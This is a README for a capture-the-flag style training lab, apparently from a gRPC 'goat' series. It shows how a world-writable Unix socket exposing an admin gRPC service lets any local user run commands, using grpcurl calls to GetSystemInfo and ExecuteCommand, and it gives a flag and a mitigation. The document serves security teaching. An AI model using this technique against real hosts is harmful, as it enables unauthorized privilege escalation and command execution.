# Lab 006: Unix Socket World Writable

## Vulnerability
Admin gRPC service listening on Unix domain socket with world read/write permissions (0666).

## Objective
Connect to the Unix socket as any user to access privileged admin functions.

## Run the Lab
```bash
# Build and run
docker build -t grpc-006 .
docker run -it --rm grpc-006 sh

# In the container, the service will be running
# Check socket permissions
ls -la /tmp/grpc-admin.sock
```

## Exploit

### Step 1: Verify socket permissions
```bash
# Check the socket permissions
ls -la /tmp/grpc-admin.sock
# Should show: srw-rw-rw- (world writable)

# Check who can access it
stat /tmp/grpc-admin.sock
```

### Step 2: Connect as any user
```bash
# Install grpcurl in the container
apk add --no-cache go
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Connect via Unix socket to get system info
grpcurl -plaintext -unix /tmp/grpc-admin.sock admin.AdminService/GetSystemInfo

# Access admin command interface (shows privilege escalation)
grpcurl -plaintext -unix /tmp/grpc-admin.sock -d '{
  "command": "whoami"
}' admin.AdminService/ExecuteCommand
```

## Impact
Any user on the system can connect to the admin service and execute privileged operations.

## Flag
Successfully connect to get: `GRPC_GOAT{unix_socket_world_writable_privilege_escalation}`

## Mitigation
Set proper socket permissions (0600) and validate client credentials.